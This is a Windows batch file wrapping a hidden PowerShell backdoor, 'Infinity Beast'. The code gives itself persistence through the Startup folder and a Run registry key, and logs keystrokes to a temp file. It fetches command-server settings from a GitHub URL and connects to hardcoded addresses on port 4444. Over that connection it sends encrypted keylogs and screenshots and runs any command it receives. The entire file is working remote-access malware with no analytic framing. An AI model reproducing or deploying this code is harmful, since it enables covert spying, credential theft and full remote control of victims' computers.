@echo off
PowerShell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& {
# Core variables
$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\infinity_beast.ps1"
$keylogFile = "$env:TEMP\ibk_$([System.Guid]::NewGuid()).txt"
$mutexName = 'InfinityBeastMutex'
$defaultKey = 'BeastUnleashed2025!@#Secure'
$version = 'Infinity Beast v1.0'

# Prevent multiple instances
$mutex = [System.Threading.Mutex]::new($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# Ensure persistence
if (-not (Test-Path $scriptPath)) {
    Copy-Item $PSCommandPath $scriptPath -Force
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'InfinityBeast' -Value "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -ErrorAction SilentlyContinue
}

# Optimized AES Encryption
Add-Type -AssemblyName System.Security
function Encrypt-Data($data, $key) {
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, '0')[0..31])
        $aes.IV = [byte[]](0..15 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
        $ms = New-Object IO.MemoryStream
        $cs = New-Object Security.Cryptography.CryptoStream($ms, $aes.CreateEncryptor(), 'Write')
        $sw = New-Object IO.StreamWriter($cs)
        $sw.Write($data)
        $sw.Close(); $cs.Close(); $ms.Close()
        return [Convert]::ToBase64String($aes.IV + $ms.ToArray())
    } catch {
        return 'ENCRYPT_ERROR'
    }
}

function Decrypt-Data($data, $key) {
    try {
        $bytes = [Convert]::FromBase64String($data)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, '0')[0..31])
        $aes.IV = $bytes[0..15]
        $ms = New-Object IO.MemoryStream(,$bytes[16..($bytes.Length-1)])
        $cs = New-Object Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), 'Read')
        $sr = New-Object IO.StreamReader($cs)
        $result = $sr.ReadToEnd()
        $sr.Close(); $cs.Close(); $ms.Close()
        return $result
    } catch {
        return 'DECRYPT_ERROR'
    }
}

# Efficient Keylogger
function Start-Keylogger {
    $sig = '[DllImport("user32.dll")]public static extern int GetAsyncKeyState(int vKey);[DllImport("user32.dll")]public static extern short GetKeyState(int vKey);'
    Add-Type -MemberDefinition $sig -Name KeyState -Namespace Win32 -ErrorAction SilentlyContinue
    $shiftDown = $false
    while ($true) {
        Start-Sleep -Milliseconds 25
        $shiftDown = [Win32.KeyState]::GetKeyState(0x10) -band 0x8000
        for ($i = 8; $i -le 255; $i++) {
            if ([Win32.KeyState]::GetAsyncKeyState($i) -eq -32767) {
                $char = [char]$i
                if ($shiftDown -and $char -match '[a-zA-Z]') { $char = $char.ToString().ToUpper() }
                if ($char -match '[ -~]') { Add-Content $keylogFile -Value $char -ErrorAction SilentlyContinue }
            }
        }
    }
}
Start-Process powershell -ArgumentList "-NoP -W Hidden -Command IEX (Get-Content $PSCommandPath | Out-String)" -WindowStyle Hidden -ErrorAction SilentlyContinue

# Dual-IP Connection Handler
function Connect {
    $client = $null
    $rand = New-Object Random
    $servers = @(
        @{ IP = '192.168.29.238'; Port = 4444; Key = $defaultKey; Name = 'Mobile' },  # Your mobile IP
        @{ IP = '192.168.29.77'; Port = 4444; Key = $defaultKey; Name = 'Laptop' }    # Your laptop IP
    )
    while ($true) {
        try {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) InfinityBeast/1.0')
            $config = $wc.DownloadString('https://raw.githubusercontent.com/RSRSECURITY/B-door-Beast/main/config.txt')
            $parts = $config -split '::'
            $ipPort = $parts[0].Split(':')
            $servers[0].IP = $ipPort[0]
            $servers[0].Port = [int]$ipPort[1]
            $servers[0].Key = $parts[1]
        } catch {
            # Use defaults if config fetch fails
        }

        foreach ($server in $servers) {
            try {
                $client = New-Object System.Net.Sockets.TCPClient($server.IP, $server.Port)
                $stream = $client.GetStream()
                [byte[]]$buffer = 0..65535|%{0}
                $startMsg = Encrypt-Data "$version online from $server.Name" $server.Key
                $stream.Write([System.Text.Encoding]::ASCII.GetBytes($startMsg), 0, $startMsg.Length)

                while(($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                    $command = Decrypt-Data ([System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()) $server.Key
                    if ($command -eq 'DECRYPT_ERROR') { $result = 'Decryption failed'; continue }
                    try {
                        switch ($command) {
                            'keylog' {
                                $result = if (Test-Path $keylogFile) { "KEYLOG:`n" + (Get-Content $keylogFile -Raw) + "`nEND" } else { "No keys captured" }
                            }
                            'screenshot' {
                                Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
                                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                                $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
                                $graphics = [Drawing.Graphics]::FromImage($bitmap)
                                $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
                                $ms = New-Object IO.MemoryStream
                                $bitmap.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
                                $base64 = [Convert]::ToBase64String($ms.ToArray())
                                $result = "SCREENSHOT:`n$base64`nEND"
                                $graphics.Dispose(); $bitmap.Dispose(); $ms.Close()
                            }
                            'stealth' {
                                (Get-Process -Id $PID).PriorityClass = 'Idle'
                                $result = 'Stealth mode engaged'
                            }
                            'exit' {
                                $result = "$version offline from $server.Name"
                                $stream.Write([System.Text.Encoding]::ASCII.GetBytes(Encrypt-Data $result $server.Key), 0, (Encrypt-Data $result $server.Key).Length)
                                $client.Close()
                                return
                            }
                            default {
                                $result = Invoke-Expression $command 2>&1 | Out-String
                            }
                        }
                    } catch {
                        $result = "Error: $_"
                    }
                    $response = Encrypt-Data ($result + "IB> ") $server.Key
                    if ($response -ne 'ENCRYPT_ERROR') {
                        $stream.Write([System.Text.Encoding]::ASCII.GetBytes($response), 0, $response.Length)
                        $stream.Flush()
                    }
                    Start-Sleep -Milliseconds ($rand.Next(300, 1200))
                }
            } catch {
                if ($client) { $client.Close() }
                Write-Output "Failed to connect to $($server.Name) at $($server.IP):$($server.Port)" | Out-Null
            }
            if ($client -and $client.Connected) { break }
            Start-Sleep -Seconds ($rand.Next(5, 10))
        }
    }
}
Connect
}" >nul 2>&1